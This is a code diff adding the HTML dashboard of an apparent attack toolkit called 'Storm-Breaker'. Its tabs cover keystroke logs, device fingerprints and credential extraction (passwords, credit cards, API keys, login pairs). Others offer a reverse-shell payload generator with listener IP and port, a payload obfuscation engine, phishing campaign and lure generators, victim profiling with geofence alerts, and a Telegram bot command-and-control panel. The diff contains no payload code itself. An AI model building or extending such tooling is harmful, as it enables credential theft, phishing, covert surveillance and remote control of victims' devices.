+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-chart-pie text-blue-400"></i>
+                                <span>Advanced Analytics</span>
+                            </h2>
+                            <div class="flex space-x-3">
+                                <button onclick="refreshAnalytics()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg text-sm font-medium transition-colors border border-slate-700 flex items-center space-x-2">
+                                    <i class="fas fa-sync-alt"></i> <span>Refresh</span>
+                                </button>
+                                <button onclick="exportAllData()" class="px-4 py-2 bg-blue-500/10 hover:bg-blue-500/20 text-blue-400 rounded-lg text-sm font-medium transition-colors border border-blue-500/20 flex items-center space-x-2">
+                                    <i class="fas fa-file-archive"></i> <span>Export ZIP</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                            <!-- Capture Breakdown Chart -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-4">Capture Breakdown</h3>
+                                <div style="height: 250px;"><canvas id="capture-breakdown-chart"></canvas></div>
+                            </div>
+
+                            <!-- System Resources -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-4">System Resources</h3>
+                                <div class="space-y-4">
+                                    <div>
+                                        <div class="flex justify-between text-xs text-slate-400 mb-1"><span>CPU Usage</span><span id="analytics-cpu">0%</span></div>
+                                        <div class="w-full bg-slate-800 rounded-full h-2.5"><div id="analytics-cpu-bar" class="bg-blue-500 h-2.5 rounded-full transition-all duration-500" style="width: 0%"></div></div>
+                                    </div>
+                                    <div>
+                                        <div class="flex justify-between text-xs text-slate-400 mb-1"><span>Memory Usage</span><span id="analytics-mem">0%</span></div>
+                                        <div class="w-full bg-slate-800 rounded-full h-2.5"><div id="analytics-mem-bar" class="bg-purple-500 h-2.5 rounded-full transition-all duration-500" style="width: 0%"></div></div>
+                                    </div>
+                                    <div>
+                                        <div class="flex justify-between text-xs text-slate-400 mb-1"><span>Disk Usage</span><span id="analytics-disk">0%</span></div>
+                                        <div class="w-full bg-slate-800 rounded-full h-2.5"><div id="analytics-disk-bar" class="bg-emerald-500 h-2.5 rounded-full transition-all duration-500" style="width: 0%"></div></div>
+                                    </div>
+                                    <div class="grid grid-cols-2 gap-3 mt-4 text-xs">
+                                        <div class="bg-slate-800/50 rounded-lg p-3">
+                                            <div class="text-slate-500">Platform</div>
+                                            <div id="analytics-platform" class="text-white font-mono mt-1">-</div>
+                                        </div>
+                                        <div class="bg-slate-800/50 rounded-lg p-3">
+                                            <div class="text-slate-500">Python</div>
+                                            <div id="analytics-python" class="text-white font-mono mt-1">-</div>
+                                        </div>
+                                        <div class="bg-slate-800/50 rounded-lg p-3">
+                                            <div class="text-slate-500">Uptime</div>
+                                            <div id="analytics-uptime" class="text-white font-mono mt-1">-</div>
+                                        </div>
+                                        <div class="bg-slate-800/50 rounded-lg p-3">
+                                            <div class="text-slate-500">Unique IPs</div>
+                                            <div id="analytics-ips" class="text-white font-mono mt-1">0</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Fingerprints Table -->
+                        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                            <h3 class="text-sm font-bold text-slate-300 mb-4 flex items-center space-x-2">
+                                <i class="fas fa-fingerprint text-blue-400"></i>
+                                <span>Device Fingerprints</span>
+                            </h3>
+                            <div id="fingerprints-table" class="overflow-x-auto">
+                                <div class="text-xs text-slate-600 py-4 text-center">Loading fingerprints...</div>
+                            </div>
+                        </div>
+
+                        <!-- Keystrokes Table -->
+                        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                            <h3 class="text-sm font-bold text-slate-300 mb-4 flex items-center space-x-2">
+                                <i class="fas fa-keyboard text-red-400"></i>
+                                <span>Keystroke Logs</span>
+                            </h3>
+                            <div id="keystrokes-table" class="overflow-x-auto">
+                                <div class="text-xs text-slate-600 py-4 text-center">Loading keystroke logs...</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ===== INTEL TAB ===== -->
+                    <div id="tab-intel" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-shield-alt text-yellow-400"></i>
+                                <span>Threat Intelligence</span>
+                            </h2>
+                        </div>
+
+                        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                            <!-- Network Info -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-3 flex items-center space-x-2">
+                                    <i class="fas fa-network-wired text-blue-400"></i>
+                                    <span>Network Interfaces</span>
+                                </h3>
+                                <div id="intel-network" class="space-y-2 text-xs">
+                                    <div class="text-slate-600">Loading...</div>
+                                </div>
+                            </div>
+
+                            <!-- Server Info -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-3 flex items-center space-x-2">
+                                    <i class="fas fa-server text-emerald-400"></i>
+                                    <span>Server Details</span>
+                                </h3>
+                                <div id="intel-server" class="space-y-2 text-xs">
+                                    <div class="text-slate-600">Loading...</div>
+                                </div>
+                            </div>
+
+                            <!-- Active Connections -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-3 flex items-center space-x-2">
+                                    <i class="fas fa-plug text-purple-400"></i>
+                                    <span>Active Connections</span>
+                                </h3>
+                                <div id="intel-connections" class="space-y-2 text-xs">
+                                    <div class="text-slate-600">Loading...</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Full Event Log -->
+                        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                            <div class="flex items-center justify-between mb-3">
+                                <h3 class="text-sm font-bold text-slate-300 flex items-center space-x-2">
+                                    <i class="fas fa-list text-yellow-400"></i>
+                                    <span>Full Event Log</span>
+                                </h3>
+                                <div class="flex space-x-2">
+                                    <input type="text" id="event-search" placeholder="Filter events..." class="bg-slate-800 border border-slate-700 rounded px-3 py-1 text-xs text-slate-300 w-48 focus:outline-none focus:border-blue-500" oninput="filterEvents()">
+                                    <button onclick="exportEvents()" class="px-3 py-1 bg-slate-800 text-slate-400 rounded text-xs hover:bg-slate-700 border border-slate-700">
+                                        <i class="fas fa-download"></i> Export
+                                    </button>
+                                </div>
+                            </div>
+                            <div id="intel-event-log" class="max-h-[400px] overflow-y-auto space-y-1">
+                                <div class="text-xs text-slate-600 py-4 text-center">Loading events...</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ===== CREDENTIALS TAB ===== -->
+                    <div id="tab-credentials" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-key text-red-400"></i>
+                                <span>Credential Intelligence</span>
+                            </h2>
+                            <div class="flex gap-2">
+                                <button id="credScanBtn" onclick="CredentialIntel.scanCredentials()" class="px-4 py-2 bg-red-600 hover:bg-red-500 text-white rounded-lg text-sm font-medium transition-colors">
+                                    <i class="fas fa-search mr-2"></i>Scan All Data
+                                </button>
+                                <button onclick="CredentialIntel.loadPairs()" class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm font-medium transition-colors">
+                                    <i class="fas fa-user-lock mr-2"></i>View Pairs
+                                </button>
+                                <button onclick="CredentialIntel.exportCredentials()" class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm font-medium transition-colors">
+                                    <i class="fas fa-download mr-2"></i>Export CSV
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+                            <!-- Stats Panel -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-3">Statistics</h3>
+                                <div id="credentialStats">
+                                    <div class="text-xs text-slate-600 text-center py-4">Run a scan to see stats</div>
+                                </div>
+
+                                <!-- Type Filter -->
+                                <div class="mt-4 space-y-1">
+                                    <div class="text-xs font-bold text-slate-400 mb-2">Filter by Type</div>
+                                    <button onclick="CredentialIntel.filterByType('all')" class="w-full text-left text-xs px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 transition-colors">All Types</button>
+                                    <button onclick="CredentialIntel.filterByType('email')" class="w-full text-left text-xs px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-blue-400 transition-colors"><i class="fas fa-envelope mr-2"></i>Emails</button>
+                                    <button onclick="CredentialIntel.filterByType('password')" class="w-full text-left text-xs px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-red-400 transition-colors"><i class="fas fa-lock mr-2"></i>Passwords</button>
+                                    <button onclick="CredentialIntel.filterByType('credit_card')" class="w-full text-left text-xs px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-yellow-400 transition-colors"><i class="fas fa-credit-card mr-2"></i>Credit Cards</button>
+                                    <button onclick="CredentialIntel.filterByType('api_key')" class="w-full text-left text-xs px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-purple-400 transition-colors"><i class="fas fa-key mr-2"></i>API Keys</button>
+                                    <button onclick="CredentialIntel.filterByType('credential_pair')" class="w-full text-left text-xs px-3 py-1.5 rounded bg-slate-800 hover:bg-slate-700 text-pink-400 transition-colors"><i class="fas fa-user-lock mr-2"></i>Pairs</button>
+                                </div>
+                            </div>
+
+                            <!-- Credentials Table -->
+                            <div class="lg:col-span-3 bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-3">Extracted Credentials</h3>
+                                <div class="overflow-x-auto max-h-[500px] overflow-y-auto">
+                                    <table class="w-full text-sm">
+                                        <thead class="text-xs text-slate-400 uppercase border-b border-slate-700 sticky top-0 bg-slate-900">
+                                            <tr>
+                                                <th class="px-4 py-2 text-left">Type</th>
+                                                <th class="px-4 py-2 text-left">Value</th>
+                                                <th class="px-4 py-2 text-left">Source</th>
+                                                <th class="px-4 py-2 text-left">URL</th>
+                                                <th class="px-4 py-2 text-left">Confidence</th>
+                                                <th class="px-4 py-2 text-left">Actions</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody id="credentialsTableBody" class="text-slate-300">
+                                            <tr><td colspan="6" class="text-center py-8 text-slate-600">
+                                                <i class="fas fa-key text-3xl mb-2"></i><br>Click "Scan All Data" to extract credentials
+                                            </td></tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Credential Pairs -->
+                        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                            <h3 class="text-sm font-bold text-slate-300 mb-3 flex items-center space-x-2">
+                                <i class="fas fa-user-lock text-red-400"></i>
+                                <span>Username:Password Pairs</span>
+                            </h3>
+                            <div id="credentialPairs" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                                <div class="text-center text-slate-600 py-4 col-span-3">Click "View Pairs" to load credential pairs</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ===== PAYLOADS TAB ===== -->
+                    <div id="tab-payloads" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-crosshairs text-cyan-400"></i>
+                                <span>Payload Generator</span>
+                            </h2>
+                        </div>
+
+                        <!-- Payload Type Grid -->
+                        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                            <h3 class="text-sm font-bold text-slate-300 mb-4">Select Payload Type</h3>
+                            <div id="payloadTypeGrid">
+                                <div class="text-sm text-slate-600 text-center py-4">Loading payload types...</div>
+                            </div>
+                        </div>
+
+                        <!-- Config Section -->
+                        <input type="hidden" id="selectedPayloadType" value="">
+                        <div id="payloadConfigSection" class="hidden bg-slate-900 rounded-xl border border-slate-800 p-5 space-y-4">
+                            <h3 class="text-sm font-bold text-slate-300 mb-3">Configuration</h3>
+                            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">LHOST (Listener IP)</label>
+                                    <input type="text" id="payloadLhost" value="127.0.0.1" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-cyan-500" placeholder="Your IP address">
+                                </div>
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">LPORT (Listener Port)</label>
+                                    <input type="text" id="payloadLport" value="4444" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-cyan-500" placeholder="4444">
+                                </div>
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Callback URL (optional)</label>
+                                    <input type="text" id="payloadCallbackUrl" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-cyan-500" placeholder="http://your-ngrok-url">
+                                </div>
+                            </div>
+                            <div id="payloadTemplateField" class="hidden">
+                                <label class="text-xs text-slate-400 block mb-1">Template (for phishing payloads)</label>
+                                <input type="text" id="payloadTemplate" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-cyan-500" placeholder="zoom_meeting">
+                            </div>
+                            <div class="flex items-center gap-4">
+                                <label class="flex items-center gap-2 text-sm text-slate-400 cursor-pointer">
+                                    <input type="checkbox" id="payloadObfuscate" class="rounded bg-slate-800 border-slate-700 text-cyan-500 focus:ring-cyan-500">
+                                    <span>Obfuscate / Encode</span>
+                                </label>
+                                <button id="generatePayloadBtn" onclick="PayloadGenerator.generate()" class="px-6 py-2.5 bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-400 hover:to-blue-400 text-white rounded-lg text-sm font-bold transition-all shadow-lg shadow-cyan-500/20">
+                                    <i class="fas fa-bolt mr-2"></i>Generate Payload
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Output Section -->
+                        <div id="payloadOutput" class="hidden space-y-4">
+                            <div id="payloadCodeOutput" class="bg-slate-900 rounded-xl border border-slate-800 p-5"></div>
+                            <div id="payloadOneLiner" class="bg-slate-900 rounded-xl border border-slate-800 p-5"></div>
+                        </div>
+                    </div>
+
+                    <!-- ===== CAMPAIGNS TAB ===== -->
+                    <div id="tab-campaigns" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-bullhorn text-orange-400"></i>
+                                <span>Campaign Manager</span>
+                            </h2>
+                        </div>
+
+                        <!-- Create Campaign Form -->
+                        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                            <h3 class="text-sm font-bold text-slate-300 mb-3">Create New Campaign</h3>
+                            <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Campaign Name</label>
+                                    <input type="text" id="campaignName" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-orange-500" placeholder="Operation Alpha">
+                                </div>
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Template</label>
+                                    <select id="campaignTemplate" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-orange-500">
+                                        <option value="">Select template...</option>
+                                    </select>
+                                </div>
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Callback URL (opt)</label>
+                                    <input type="text" id="campaignCallbackUrl" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-orange-500" placeholder="http://...">
+                                </div>
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Description</label>
+                                    <input type="text" id="campaignDescription" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-orange-500" placeholder="Optional description">
+                                </div>
+                            </div>
+                            <button onclick="CampaignManager.createCampaign()" class="px-6 py-2.5 bg-gradient-to-r from-orange-500 to-red-500 hover:from-orange-400 hover:to-red-400 text-white rounded-lg text-sm font-bold transition-all shadow-lg shadow-orange-500/20">
+                                <i class="fas fa-plus mr-2"></i>Create Campaign
+                            </button>
+                        </div>
+
+                        <!-- Campaigns List -->
+                        <div id="campaignsList" class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                            <div class="text-center py-8 text-slate-600 col-span-2">
+                                <i class="fas fa-bullhorn text-4xl mb-3"></i>
+                                <p>Loading campaigns...</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ===== PROFILES TAB ===== -->
+                    <div id="tab-profiles" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-user-secret text-purple-400"></i>
+                                <span>Victim Profiles & Recon</span>
+                            </h2>
+                            <div class="flex gap-2">
+                                <button id="buildProfilesBtn" onclick="VictimProfiler.buildProfiles()" class="px-4 py-2 bg-purple-600 hover:bg-purple-500 text-white rounded-lg text-sm font-medium transition-colors">
+                                    <i class="fas fa-users-cog mr-2"></i>Auto-Build Profiles
+                                </button>
+                                <button id="runReconBtn" onclick="VictimProfiler.runRecon()" class="px-4 py-2 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-500 hover:to-emerald-500 text-white rounded-lg text-sm font-bold transition-colors shadow-lg shadow-green-500/20">
+                                    <i class="fas fa-robot mr-2"></i>Run Auto-Recon
+                                </button>
+                                <button onclick="VictimProfiler.exportProfiles()" class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm font-medium transition-colors">
+                                    <i class="fas fa-download mr-2"></i>Export
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Profiles Grid -->
+                        <div id="profilesList" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                            <div class="text-center py-8 text-slate-600 col-span-3">
+                                <i class="fas fa-user-secret text-4xl mb-3"></i>
+                                <p>Loading profiles...</p>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                            <!-- Geofence Manager -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-3 flex items-center space-x-2">
+                                    <i class="fas fa-draw-polygon text-green-400"></i>
+                                    <span>Geofence Alerts</span>
+                                </h3>
+                                <div class="grid grid-cols-4 gap-2 mb-3">
+                                    <input type="text" id="geofenceName" placeholder="Name" class="bg-slate-800 border border-slate-700 rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-green-500">
+                                    <input type="number" id="geofenceLat" placeholder="Latitude" step="0.0001" class="bg-slate-800 border border-slate-700 rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-green-500">
+                                    <input type="number" id="geofenceLon" placeholder="Longitude" step="0.0001" class="bg-slate-800 border border-slate-700 rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-green-500">
+                                    <div class="flex gap-1">
+                                        <input type="number" id="geofenceRadius" placeholder="km" value="1" step="0.1" class="w-16 bg-slate-800 border border-slate-700 rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-green-500">
+                                        <button onclick="VictimProfiler.createGeofence()" class="bg-green-600 hover:bg-green-500 text-white px-3 rounded text-xs font-medium transition-colors">
+                                            <i class="fas fa-plus"></i>
+                                        </button>
+                                    </div>
+                                </div>
+                                <div id="geofencesList" class="space-y-2 max-h-[250px] overflow-y-auto">
+                                    <div class="text-xs text-slate-600 text-center py-4">No geofences defined</div>
+                                </div>
+                            </div>
+
+                            <!-- Telegram Bot Config -->
+                            <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                <h3 class="text-sm font-bold text-slate-300 mb-3 flex items-center space-x-2">
+                                    <i class="fab fa-telegram text-blue-400"></i>
+                                    <span>Telegram Bot C2</span>
+                                    <span id="telegramStatus" class="ml-auto text-xs"></span>
+                                </h3>
+                                <div class="space-y-3">
+                                    <div>
+                                        <label class="text-xs text-slate-400 block mb-1">Bot Token</label>
+                                        <input type="password" id="telegramToken" class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-xs text-white focus:outline-none focus:border-blue-500" placeholder="123456:ABC-DEF...">
+                                    </div>
+                                    <div>
+                                        <label class="text-xs text-slate-400 block mb-1">Chat ID</label>
+                                        <input type="text" id="telegramChatId" class="w-full bg-slate-800 border border-slate-700 rounded px-3 py-2 text-xs text-white focus:outline-none focus:border-blue-500" placeholder="Your Telegram Chat ID">
+                                    </div>
+                                    <div class="flex gap-2">
+                                        <button onclick="VictimProfiler.saveTelegramConfig()" class="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded text-xs font-medium transition-colors">
+                                            <i class="fas fa-save mr-1"></i>Save
+                                        </button>
+                                        <button onclick="VictimProfiler.testTelegram()" class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded text-xs font-medium transition-colors">
+                                            <i class="fas fa-paper-plane mr-1"></i>Test
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ===== OBFUSCATION TAB ===== -->
+                    <div id="tab-obfuscation" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-mask text-pink-400"></i>
+                                <span>Payload Obfuscation Engine</span>
+                            </h2>
+                        </div>
+                        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                            <div class="space-y-4">
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                    <h3 class="text-sm font-bold text-slate-300 mb-3"><i class="fas fa-cog text-pink-400 mr-2"></i>Configuration</h3>
+                                    <div class="space-y-3">
+                                        <div>
+                                            <label class="text-xs text-slate-400 block mb-1">Language</label>
+                                            <select id="obfuscation-language" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-pink-500">
+                                                <option value="powershell">PowerShell</option>
+                                                <option value="python">Python</option>
+                                                <option value="javascript">JavaScript</option>
+                                                <option value="bash">Bash</option>
+                                            </select>
+                                        </div>
+                                        <div>
+                                            <label class="text-xs text-slate-400 block mb-1">Obfuscation Profile</label>
+                                            <select id="obfuscation-profile" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-pink-500">
+                                            </select>
+                                        </div>
+                                        <div>
+                                            <label class="text-xs text-slate-400 block mb-1">Techniques (optional override)</label>
+                                            <div id="obfuscation-techniques" class="space-y-1 max-h-[150px] overflow-y-auto bg-slate-800 rounded-lg p-3"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                    <h3 class="text-sm font-bold text-slate-300 mb-3"><i class="fas fa-code text-pink-400 mr-2"></i>Input Payload</h3>
+                                    <textarea id="obfuscation-input" rows="8" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-green-400 font-mono focus:outline-none focus:border-pink-500 resize-none" placeholder="Paste your payload here..."></textarea>
+                                    <div class="flex gap-2 mt-3">
+                                        <button id="btn-obfuscate" class="px-4 py-2 bg-gradient-to-r from-pink-600 to-purple-600 hover:from-pink-500 hover:to-purple-500 text-white rounded-lg text-sm font-bold transition-all">
+                                            <i class="fas fa-mask mr-2"></i>Obfuscate
+                                        </button>
+                                        <button id="btn-obfusc-from-payload" class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm font-medium transition-colors">
+                                            <i class="fas fa-crosshairs mr-2"></i>Load from Payloads
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="space-y-4">
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                    <div class="flex items-center justify-between mb-3">
+                                        <h3 class="text-sm font-bold text-slate-300"><i class="fas fa-shield-alt text-pink-400 mr-2"></i>Obfuscated Output</h3>
+                                        <button id="btn-obfusc-copy" class="px-3 py-1 bg-slate-700 hover:bg-slate-600 text-white rounded text-xs font-medium transition-colors">
+                                            <i class="fas fa-copy mr-1"></i>Copy
+                                        </button>
+                                    </div>
+                                    <pre id="obfuscation-output" class="bg-slate-800 rounded-lg p-4 text-xs text-cyan-400 font-mono overflow-auto max-h-[350px] whitespace-pre-wrap break-all"></pre>
+                                </div>
+                                <div id="obfusc-stats" class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                    <p class="text-gray-400 text-sm text-center">Obfuscation stats will appear here</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ===== REPORTS TAB ===== -->
+                    <div id="tab-reports" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-file-alt text-indigo-400"></i>
+                                <span>Report Generator</span>
+                            </h2>
+                        </div>
+                        <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                            <h3 class="text-sm font-bold text-slate-300 mb-4"><i class="fas fa-cog text-indigo-400 mr-2"></i>Report Configuration</h3>
+                            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-4">
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Report Title</label>
+                                    <input type="text" id="report-title" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-indigo-500" value="Storm-Breaker Penetration Test Report">
+                                </div>
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Organization</label>
+                                    <input type="text" id="report-org" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-indigo-500" value="Security Assessment Team">
+                                </div>
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Target</label>
+                                    <input type="text" id="report-target" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-indigo-500" value="Target Organization">
+                                </div>
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Author</label>
+                                    <input type="text" id="report-author" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-indigo-500" value="Operator">
+                                </div>
+                                <div>
+                                    <label class="text-xs text-slate-400 block mb-1">Classification</label>
+                                    <select id="report-classification" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-indigo-500">
+                                        <option value="CONFIDENTIAL">CONFIDENTIAL</option>
+                                        <option value="TOP SECRET">TOP SECRET</option>
+                                        <option value="RESTRICTED">RESTRICTED</option>
+                                        <option value="INTERNAL">INTERNAL ONLY</option>
+                                    </select>
+                                </div>
+                                <div class="flex items-end">
+                                    <button id="btn-generate-report" class="w-full px-4 py-2 bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 text-white rounded-lg text-sm font-bold transition-all shadow-lg shadow-indigo-500/20">
+                                        <i class="fas fa-file-pdf mr-2"></i>Generate Report
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="space-y-3" id="report-list">
+                            <div class="text-center py-8 text-slate-600">
+                                <i class="fas fa-file-alt text-4xl mb-3"></i>
+                                <p>Loading reports...</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ===== LURES TAB ===== -->
+                    <div id="tab-lures" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between">
+                            <h2 class="text-xl font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-envelope-open-text text-emerald-400"></i>
+                                <span>Phishing Lure Generator</span>
+                            </h2>
+                        </div>
+                        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                            <div class="space-y-4">
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
+                                    <h3 class="text-sm font-bold text-slate-300 mb-3"><i class="fas fa-folder text-emerald-400 mr-2"></i>Template Selection</h3>
+                                    <div class="space-y-3">
+                                        <div>
+                                            <label class="text-xs text-slate-400 block mb-1">Category</label>
+                                            <select id="lure-category" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-emerald-500"></select>
+                                        </div>
+                                        <div>
+                                            <label class="text-xs text-slate-400 block mb-1">Template</label>
+                                            <select id="lure-template" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-emerald-500"></select>
+                                        </div>
+                                        <div>
+                                            <label class="text-xs text-slate-400 block mb-1">Type</label>
+                                            <select id="lure-type" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-emerald-500">
+                                                <option value="email">📧 Email</option>
+                                                <option value="sms">📱 SMS</option>
+                                            </select>
+                                        </div>
+                                        <button id="btn-preview-lure" class="w-full px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm font-medium transition-colors">
+                                            <i class="fas fa-eye mr-2"></i>Preview Template
+                                        </button>
+                                    </div>
+                                </div>
+                                <div class="bg-slate-900 rounded-xl border border-slate-800 p-5">
